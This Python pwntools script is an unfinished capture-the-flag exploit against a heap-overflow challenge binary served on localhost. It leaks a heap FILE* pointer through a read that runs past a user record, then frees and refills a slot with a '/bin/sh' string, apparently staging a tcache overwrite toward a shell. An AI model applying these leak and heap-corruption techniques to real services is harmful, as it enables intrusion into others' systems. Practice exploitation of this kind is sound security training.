#!/usr/bin/env python3
"""
CTF Pwn exploit for chal (heap overflow challenge)
glibc 2.43, Arch Linux, Partial RELRO, PIE, NX
"""

from pwn import *
import sys

context.arch = 'amd64'
context.log_level = 'info'

BINARY = '/home/light/Workspace/CTF/no_hack_no_ctf/67/chal/share/chal'
LIBC = '/tmp/libc.so.6'

# Connection
HOST = '127.0.0.1'
PORT = 16767

def conn(local=False):
    if local:
        return process(BINARY)
    return remote(HOST, PORT)

def register(r, username):
    """Register a new user (auto-assigns to first free slot). Username max 0x40 bytes."""
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b'username: ', username)
    # Returns line like "registered at slot 0"
    line = r.recvline()
    return int(line.split(b'slot ')[1].split()[0])

def show(r, slot):
    """Show user info at slot, returns the output (0x48 bytes)"""
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b'slot: ', str(slot).encode())
    # Read "username: " prefix
    r.recvuntil(b'username: ')
    # Read the 0x48 bytes written by write()
    out = r.recv(0x48)
    return out

def login(r, slot):
    """Login at slot - writes "login\n" to the file"""
    r.sendlineafter(b'> ', b'3')
    r.sendlineafter(b'slot: ', str(slot).encode())

def update(r, slot, data):
    """Update user at slot with data (max 0x200 bytes via read)"""
    r.sendlineafter(b'> ', b'4')
    r.sendlineafter(b'slot: ', str(slot).encode())
    r.sendlineafter(b'new username: ', data)

def delete(r, slot):
    """Delete user at slot - fcloses FILE*, frees ptr, NULLs slot"""
    r.sendlineafter(b'> ', b'5')
    r.sendlineafter(b'slot: ', str(slot).encode())
    # "invalid" if slot invalid, otherwise just returns

def main():
    r = conn(False)

    # ============ PHASE 1: Leak heap ============
    log.info("Registering users...")
    s0 = register(r, b'A' * 0x10)  # slot 0
    log.info(f"  Registered at slot {s0}")

    s1 = register(r, b'B' * 0x10)  # slot 1
    log.info(f"  Registered at slot {s1}")

    s2 = register(r, b'C' * 0x10)  # slot 2
    log.info(f"  Registered at slot {s2}")

    s3 = register(r, b'D' * 0x10)  # slot 3
    log.info(f"  Registered at slot {s3}")

    # Show slot 0 to leak the FILE* pointer (at offset 0x40)
    log.info("Leaking via show slot 0...")
    data = show(r, 0)
    log.info(f"Raw data ({len(data)} bytes): {data.hex()}")

    # Extract FILE* from offset 0x40
    file_ptr = u64(data[0x40:0x48])
    log.success(f"FILE* (heap addr): {hex(file_ptr)}")

    heap_page = file_ptr & ~0xfff
    log.info(f"FILE* page: {hex(heap_page)}")

    # Show all slots to see their data
    for i in range(4):
        d = show(r, i)
        fn = u64(d[0x40:0x48]) if u64(d[0x40:0x48]) else 0
        log.info(f"  Slot {i}: username={d[:0x10]}..., FILE*={hex(fn) if fn else 'NULL'}")

    # ============ PHASE 2: Test heap overflow ============
    # Delete slot 1, then update slot 0 to overflow into freed slot 1's tcache fd
    log.info("Testing delete slot 1...")
    delete(r, 1)

    # Register again to refill slot 1
    s1_new = register(r, b'/bin/sh\x00' + b'\x00' * 8)
    log.info(f"Re-registered at slot {s1_new}")

    # Show slot 1 to see if we got the old chunk back (or new data)
    d1 = show(r, s1_new)
    log.info(f"Slot {s1_new} (after re-reg): username={d1[:0x20].rstrip(b'\\x00')}")

    r.interactive()

if __name__ == '__main__':
    main()
